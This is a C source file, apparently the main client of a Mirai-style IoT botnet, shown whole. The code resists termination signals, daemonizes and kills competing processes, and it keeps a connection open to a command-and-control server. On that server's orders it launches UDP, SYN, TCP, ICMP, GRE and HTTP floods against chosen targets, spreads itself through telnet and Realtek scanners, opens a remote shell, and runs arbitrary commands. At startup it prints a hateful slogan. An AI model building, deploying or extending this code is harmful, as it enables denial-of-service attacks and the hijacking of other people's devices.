#define _GNU_SOURCE

#include "headers/attack_params.h"
#include "headers/daemon.h"
#include "headers/killer.h"
#include "headers/scanner.h"
#include "headers/shell_listener.h"
#include "headers/utils.h"
#include <pthread.h>
#include <linux/limits.h>
#include <netdb.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/stat.h>

#define CNC_IP "0.0.0.0" // ip or domain
#define BOT_PORT 8060
#define RETRY_DELAY 2
#define RECV_TIMEOUT_MS 25000
#define MAX_RETRIES 25 // if we want to get rid of us if cnc is dead, useful to save bot energy
#define CONNECTION_TIMEOUT 3
#define PING_INTERVAL 3
#define FAST_RETRY_COUNT 5
#define FAST_RETRY_DELAY 1

int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int timeout_sec) {
    int res;
    long arg;
    fd_set myset;
    struct timeval tv;
    int valopt;
    socklen_t lon;

    res = connect(sock, addr, addrlen);
    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout_sec;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(sock, &myset);
            res = select(sock+1, NULL, &myset, NULL, &tv);
            if (res > 0) {
                lon = sizeof(int);
                getsockopt(sock, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if (!valopt) {
                    arg = fcntl(sock, F_GETFL, NULL);
                    arg &= (~O_NONBLOCK);
                    fcntl(sock, F_SETFL, arg);
                    return 0;
                }
            }
        }
        return -1;
    }

    arg = fcntl(sock, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(sock, F_SETFL, arg);

    return 0;
}

static void feed_watchdog(void) {
    static int watchdog_fd = -1;
    static time_t last_feed = 0;
    static int checked = 0;
    static int available = 0;
    time_t now = time(NULL);
    if (now - last_feed < 5) return;
    last_feed = now;
    if (!checked) {
        struct stat st;
        if (stat("/dev/watchdog", &st) == 0) available = 1;
        else if (stat("/dev/misc/watchdog", &st) == 0) available = 2;
        else if (stat("/usr/bin/watchdogd", &st) == 0) available = 3;
        else if (stat("/usr/sbin/watchdog", &st) == 0) available = 4;
        else if (stat("/sbin/watchdog", &st) == 0) available = 5;
        else if (stat("/bin/sw_watchdog", &st) == 0) available = 6;
        else if (stat("/dev/watchdog0", &st) == 0) available = 7;
        else if (stat("/dev/watchdog1", &st) == 0) available = 8;
        checked = 1;
    }
    if (!available) return;
    if (watchdog_fd == -1) {
        if (available == 1)
            watchdog_fd = open("/dev/watchdog", O_WRONLY | 0);
        else if (available == 2)
            watchdog_fd = open("/dev/misc/watchdog", O_WRONLY | 0);
        else if (available == 3)
            watchdog_fd = open("/usr/bin/watchdogd", O_WRONLY | 0);
        else if (available == 4)
            watchdog_fd = open("/usr/sbin/watchdog", O_WRONLY | 0);
        else if (available == 5)
            watchdog_fd = open("/sbin/watchdog", O_WRONLY | 0);
        else if (available == 6)
            watchdog_fd = open("/bin/sw_watchdog", O_WRONLY | 0);
        else if (available == 7)
            watchdog_fd = open("/dev/watchdog0", O_WRONLY | 0);
        else if (available == 8)
            watchdog_fd = open("/dev/watchdog1", O_WRONLY | 0);
    }
    if (watchdog_fd != -1) {
        ssize_t _unused = write(watchdog_fd, "\0", 1);
        (void)_unused;
    }
}


extern void udpplain_attack(attack_params *params);
extern void udp_attack(attack_params *params);
extern void syn_attack(attack_params *params);
extern void tcp_attack(attack_params *params);
extern void icmp_attack(attack_params *params);
extern void gre_attack(gre_attack_params *params);
extern void http_attack(attack_params *params);

struct thread_args {
    void *params;
    void (*attack_func)(void *);
};

static void *attack_thread(void *arg) {
    struct thread_args *targs = (struct thread_args *)arg;
    targs->attack_func(targs->params);
    return NULL;
}

static int telnet_on = 0;
static int realtek_on = 0;

static pthread_t running_attack_tid = 0;
static void *running_attack_params = NULL;
static int running_attack_is_gre = 0;

static void handle_command(const char *cmd, int sock) {
    static attack_params params_static;
    static gre_attack_params gre_params_static;
    if (strcmp(cmd, "stop") == 0) {
        if (running_attack_params) {
            if (running_attack_is_gre)
                ((gre_attack_params*)running_attack_params)->active = 0;
            else
                ((attack_params*)running_attack_params)->active = 0;
            if (running_attack_tid)
                pthread_join(running_attack_tid, NULL);
            running_attack_tid = 0;
            running_attack_params = NULL;
            running_attack_is_gre = 0;
        }
        return;
    }
    char buf[1024];
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    size_t len = strlen(buf);
    while (len > 0 && isspace((unsigned char)buf[len-1])) buf[--len] = 0;
    size_t start = 0;
    while (buf[start] && isspace((unsigned char)buf[start])) ++start;
    if (!buf[start]) { return; }

    if (!strncmp(buf+start, "!kill", 5) && (buf[start+5]==0 || isspace((unsigned char)buf[start+5]))) {
        killpg(getpgrp(), SIGKILL);
        return;
    }

    if (!strncmp(buf+start, "ping", 4) && (buf[start+4]==0 || isspace((unsigned char)buf[start+4]))) {
        char pongmsg[32];
        memset(pongmsg, 0, sizeof(pongmsg));
        int ponglen = snprintf(pongmsg, sizeof(pongmsg), "pong %s", get_arch());
        send(sock, pongmsg, ponglen, MSG_NOSIGNAL);
        return;
    }


    if (!strncmp(buf+start, "!selfrep telnet", 15)) {
        char *arg = buf+start+15;
        while (*arg && isspace((unsigned char)*arg)) ++arg;
        if (!strncmp(arg, "on", 2)) {
            if (!telnet_on) {
                start_telnet_scanner();
                telnet_on = 1;
            }
        } else if (!strncmp(arg, "off", 3)) {
            if (telnet_on) {
                stop_telnet_scanner();
                telnet_on = 0;
            }
        }
        return;
    }

    if (!strncmp(buf+start, "!selfrep realtek", 16)) {
        char *arg = buf+start+16;
        while (*arg && isspace((unsigned char)*arg)) ++arg;
        if (!strncmp(arg, "on", 2)) {
            if (!realtek_on) {
                start_realtek_scanner();
                realtek_on = 1;
            }
        } else if (!strncmp(arg, "off", 3)) {
            if (realtek_on) {
                stop_realtek_scanner();
                realtek_on = 0;
            }
        }
        return;
    }

    if (!strncmp(buf+start, "!openshell", 10)) {
        char *arg = buf+start+10;
        while (*arg && isspace((unsigned char)*arg)) ++arg;
        char *port_str = strtok(arg, " ");
        char *pass_str = strtok(NULL, " ");
        if (port_str && pass_str) {
            int port = atoi(port_str);
            if (port > 0 && port < 65536 && strlen(pass_str) <= 8) {
                start_shell_listener(port, pass_str);
            }
        }
        return;
    }
    if (!strncmp(buf+start, "!shellcmd ", 10)) {
        char *cmdstr = buf+start+10;
        while (*cmdstr && isspace((unsigned char)*cmdstr)) ++cmdstr;
        char reply[1024] = {0};
        char shellbuf[1024];
        snprintf(shellbuf, sizeof(shellbuf), "%s 2>&1", cmdstr);
        FILE *fp = popen(shellbuf, "r");
        if (fp) {
            size_t rlen = fread(reply, 1, sizeof(reply)-1, fp);
            reply[rlen] = 0;
            pclose(fp);
        }
        if (reply[0] == 0) {
            strcpy(reply, "\n");
            send(sock, reply, 1, MSG_NOSIGNAL);
        } else {
            send(sock, reply, strlen(reply), MSG_NOSIGNAL);
        }
        return;
    }

    if (!strncmp(buf+start, "!update", 7) && (buf[start+7]==0 || isspace((unsigned char)buf[start+7]))) {
        extern int update_bot();
        update_bot();
        killpg(getpgrp(), SIGKILL);
        return;
    }

    /*### SUBNET HANDLER ###*/
    char *saveptr;
    char *type = strtok_r(buf+start, " ", &saveptr);
    if (!type) { return; }
    if (type[0] == '!') ++type;
    char *ip_cidr = strtok_r(NULL, " ", &saveptr);
    char ipbuf[64];
    int cidr = 0;
    char *ip = NULL;
    uint32_t base_ip = 0;
    if (ip_cidr) {
        char *slash = strchr(ip_cidr, '/');
        if (slash) {
            size_t iplen = slash - ip_cidr;
            if (iplen < sizeof(ipbuf)) {
                memcpy(ipbuf, ip_cidr, iplen);
                ipbuf[iplen] = 0;
                ip = ipbuf;
                cidr = atoi(slash + 1);
            } else {
                ip = ip_cidr;
            }
        } else {
            ip = ip_cidr;
        }
        if (ip) base_ip = inet_addr(ip);
    }
    char *port_str = NULL;
    char *time_str = NULL;
    int port = 0;
    int dur = 0;



    /*### LAYER3 METHODS (IGNORE PORT) ###*/
    if (!strcmp(type, "icmp") || !strcmp(type, "gre")) {
        time_str = strtok_r(NULL, " ", &saveptr);
        if (!ip || !time_str) { return; }
        dur = atoi(time_str);
    } else {
        port_str = strtok_r(NULL, " ", &saveptr);
        time_str = strtok_r(NULL, " ", &saveptr);
        if (!ip || !port_str || !time_str) { return; }
        port = atoi(port_str);
        if (port <= 0 || port > 65535) { return; }
        dur = atoi(time_str);
    }
    int psize = 0, srcport = 0, http_method = 0, gport = 0, gre_proto = 0;
    unsigned char msg[256];
    int msg_len = 0;
    int has_msg = 0;
    int usleep_min = 0, usleep_max = 0;
    int has_usleep = 0;
    char *extra = strtok_r(NULL, " ", &saveptr);
    while (extra) {
        if (!strncmp(extra, "psize=", 6)) psize = atoi(extra+6);
        else if (!strncmp(extra, "srcport=", 8)) srcport = atoi(extra+8);
        else if (!strncmp(extra, "httpmode=", 9)) http_method = atoi(extra+9);
        else if (!strncmp(extra, "gport=", 6)) gport = atoi(extra+6);
        else if (!strncmp(extra, "gre_proto=", 10)) gre_proto = atoi(extra+10);
        else if (!strncmp(extra, "proto=", 6)) {
            if (!strcmp(extra+6, "tcp")) gre_proto = 1;
            else if (!strcmp(extra+6, "udp")) gre_proto = 2;
            else gre_proto = 0;
        }
        else if (!strncmp(extra, "msg=", 4)) {
            if (!has_msg) {
                const char *val = extra + 4;
                msg_len = 0;
                while (*val && msg_len < 256) {
                    if (strncmp(val, "0x", 2) != 0) break;
                    val += 2;
                    char hex[3] = {0};
                    if (!isxdigit(val[0]) || !isxdigit(val[1])) break;
                    hex[0] = val[0];
                    hex[1] = val[1];
                    msg[msg_len++] = (unsigned char)strtol(hex, NULL, 16);
                    val += 2;
                }
                has_msg = msg_len > 0;
            }
        }
        else if (!strncmp(extra, "usleep=", 7)) {
            if (!has_usleep) {
                char *val = extra + 7;
                char *dash = strchr(val, '-');
                if (dash) {
                    *dash = 0;
                    int minv = atoi(val);
                    int maxv = atoi(dash+1);
                    if (minv > 0 && maxv > 0 && minv <= maxv && maxv <= 40000) {
                        usleep_min = minv;
                        usleep_max = maxv;
                        has_usleep = 1;
                    }
                } else {
                    int valint = atoi(val);
                    if (valint > 0 && valint <= 40000) {
                        usleep_min = usleep_max = valint;
                        has_usleep = 1;
                    }
                }
            }
        }
        else if (!strncmp(extra, "port=", 5)) port = atoi(extra+5);
        extra = strtok_r(NULL, " ", &saveptr);
    }

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    if (!strcmp(type, "icmp") || !strcmp(type, "gre")) {
        sin.sin_port = 0;
    } else {
        sin.sin_port = htons(port);
    }
    if (ip) {
        inet_pton(AF_INET, ip, &sin.sin_addr);
    }

    struct thread_args targs;
    pthread_t tid;

    /*### Layer4 COMMAND ###*/
    if (!strcmp(type, "udpplain") || !strcmp(type, "udp") || !strcmp(type, "syn") || !strcmp(type, "tcp") || !strcmp(type, "icmp") || !strcmp(type, "http")) {
        memset(&params_static, 0, sizeof(params_static));
        params_static.target_addr = sin;
        params_static.duration = dur;
        params_static.psize = psize;
        params_static.srcport = srcport;
        params_static.http_method = http_method;
        params_static.base_ip = base_ip;
        params_static.cidr = cidr;
        params_static.active = 1;
        params_static.usleep_min = usleep_min;
        params_static.usleep_max = usleep_max;
        if (has_msg) {
            memcpy(params_static.msg, msg, msg_len);
            params_static.msg_len = msg_len;
        } else {
            params_static.msg_len = 0;
        }
        targs.params = &params_static;
        running_attack_params = &params_static;
        running_attack_is_gre = 0;
        if (!strcmp(type, "udpplain")) targs.attack_func = (void (*)(void *))udpplain_attack;
        else if (!strcmp(type, "udp")) targs.attack_func = (void (*)(void *))udp_attack;
        else if (!strcmp(type, "syn")) targs.attack_func = (void (*)(void *))syn_attack;
    else if (!strcmp(type, "tcp")) targs.attack_func = (void (*)(void *))tcp_attack;
        else if (!strcmp(type, "icmp")) targs.attack_func = (void (*)(void *))icmp_attack;
        else if (!strcmp(type, "http")) targs.attack_func = (void (*)(void *))http_attack;
    } else if (!strcmp(type, "gre")) {
        memset(&gre_params_static, 0, sizeof(gre_params_static));
        gre_params_static.target_addr = sin;
        gre_params_static.duration = dur;
        gre_params_static.psize = psize;
        gre_params_static.srcport = srcport;
        gre_params_static.gport = gport;
        gre_params_static.gre_proto = gre_proto;
        gre_params_static.base_ip = base_ip;
        gre_params_static.cidr = cidr;
        gre_params_static.active = 1;
        gre_params_static.usleep_min = usleep_min;
        gre_params_static.usleep_max = usleep_max;
        if (has_msg) {
            memcpy(gre_params_static.msg, msg, msg_len);
            gre_params_static.msg_len = msg_len;
        } else {
            gre_params_static.msg_len = 0;
        }
        targs.params = &gre_params_static;
        running_attack_params = &gre_params_static;
        running_attack_is_gre = 1;
        targs.attack_func = (void (*)(void *))gre_attack;
    } else {
        return;
    }
    int thread_res = pthread_create(&tid, NULL, attack_thread, &targs);
    if (thread_res == 0) {
        running_attack_tid = tid;
    }
}

int main(int argc, char** argv) {
    puts("Not a mirai at all");
    puts("Death to israel");
// *** Signal Protection Defense *** //
    signal(SIGINT, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGTSTP, SIG_IGN);  
    signal(SIGTTIN, SIG_IGN);  
    signal(SIGTTOU, SIG_IGN);

   daemonize(argc, argv);
   char self_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
    if(len > 0) {
        self_path[len] = '\0';
    }
    //use if targetting tplink, otherwise leave killer on 
    #ifndef KILLER_OFF
    start_killer();
    #endif

    int sock = -1;
    struct sockaddr_in server_addr;
    static char command[1024];
    ssize_t n;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(CNC_IP, NULL, &hints, &res) != 0) {
        return 1;
    }
    
    memcpy(&server_addr.sin_addr, &((struct sockaddr_in *)res->ai_addr)->sin_addr, sizeof(struct in_addr));
    freeaddrinfo(res);

    int reconnect_attempts= 0;
    time_t last_ping = 0;
    //some embeds ignore first arg so default to be safe

    char group_name[64] = "default";
    if (argc > 1 && argv[1] && argv[1][0] != '\0') {
        strncpy(group_name, argv[1], sizeof(group_name)-1);
        group_name[sizeof(group_name)-1] = '\0';
    }

    while (1) {
        feed_watchdog();
        if (sock != -1) {
            shutdown(sock, SHUT_RDWR);
            close(sock);
            sock = -1;
        }


        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            if (++reconnect_attempts >= MAX_RETRIES) {
                _exit(42);
            }
            sleep(RETRY_DELAY * reconnect_attempts);
            continue;
        }

    int nodelay = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
    int keepalive = 1;
    setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));

        int orig_flags = fcntl(sock, F_GETFL, 0);
        if (orig_flags != -1) {
            fcntl(sock, F_SETFL, orig_flags | O_NONBLOCK);
        }

        int connection_result = connect_with_timeout(sock, (struct sockaddr*)&server_addr, sizeof(server_addr), CONNECTION_TIMEOUT);
        if (connection_result == 0) {
            reconnect_attempts = 0;
            int flags = fcntl(sock, F_GETFL, 0);
            if (flags != -1) {
                fcntl(sock, F_SETFL, flags & ~O_NONBLOCK);
            }
        }

        if (connection_result != 0) {
            if (sock != -1) {
                shutdown(sock, SHUT_RDWR);
                close(sock);
                sock = -1;
            }
            reconnect_attempts++;
            if (reconnect_attempts >= MAX_RETRIES) {
                exit(42);
            }
            if (reconnect_attempts <= FAST_RETRY_COUNT) {
                sleep(FAST_RETRY_DELAY);
            } else {
                int delay = RETRY_DELAY * ((reconnect_attempts - FAST_RETRY_COUNT) / 5 + 1);
                if (delay > 5) delay = 5;
                sleep(delay);
            }
            continue;
        }
        //send group and arch
        char idmsg[128];
        const char *arch = get_arch();
        size_t arch_len = strlen(arch);
        size_t group_len = strlen(group_name);
        if (arch_len + 1 + group_len >= sizeof(idmsg)) {
            close(sock);
            sock = -1;
            continue;
        }
        memcpy(idmsg, arch, arch_len);
        idmsg[arch_len] = ' ';
        memcpy(idmsg + arch_len + 1, group_name, group_len);
        idmsg[arch_len + 1 + group_len] = '\0';
        if (send(sock, idmsg, arch_len + 1 + group_len, MSG_NOSIGNAL) <= 0) {
            close(sock);
            sock = -1;
            continue;
        }

        reconnect_attempts = 0;
        last_ping = time(NULL);

        int stuck_count = 0;
        while (1) {
            feed_watchdog();
            fd_set readfds;
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            FD_ZERO(&readfds);
            FD_SET(sock, &readfds);
            int sel = select(sock + 1, &readfds, NULL, NULL, &tv);
            time_t now = time(NULL);
            if (sel < 0) {
                shutdown(sock, SHUT_RDWR);
                close(sock);
                sock = -1;
                break;
            } else if (sel == 0) {
                if (++stuck_count > 60) {
                    shutdown(sock, SHUT_RDWR);
                    close(sock);
                    sock = -1;
                    break;
                }
                usleep(50000);
                continue;
            } else if (FD_ISSET(sock, &readfds)) {
                stuck_count = 0;
                n = recv(sock, command, sizeof(command)-1, MSG_NOSIGNAL);
                if (n == 0) {
                    shutdown(sock, SHUT_RDWR);
                    close(sock);
                    sock = -1;
                    break;
                } else if (n < 0) {
                    if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
                        shutdown(sock, SHUT_RDWR);
                        close(sock);
                        sock = -1;
                        break;
                    }
                    continue;
                }
                command[n] = 0;
                handle_command(command, sock);
                memset(command, 0, sizeof(command));
            }
        }

        if (sock != -1) {
            shutdown(sock, SHUT_RDWR);
            close(sock);
            sock = -1;
        }
        sleep(RETRY_DELAY);
    }

    return 0;
}
